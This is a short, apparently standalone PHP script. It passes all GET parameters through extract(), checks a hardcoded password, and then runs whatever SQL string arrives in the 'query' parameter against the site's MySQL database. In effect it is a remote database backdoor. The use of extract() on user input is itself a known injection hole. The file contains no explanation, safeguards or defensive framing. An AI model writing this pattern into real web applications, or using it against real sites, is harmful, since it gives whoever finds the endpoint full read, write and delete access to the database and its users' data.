<?php
require_once("functions.php");
@extract($_GET);
if ($password !== 'xxxxxxxxxxxxxxxxxxxxx') { exit; }
$mysqli = new mysqli(DB_HOST, DB_USERNAME, DB_PASSWORD, DB_DATABASE);
$result = $mysqli->query($query);
$mysqli->close();
?>
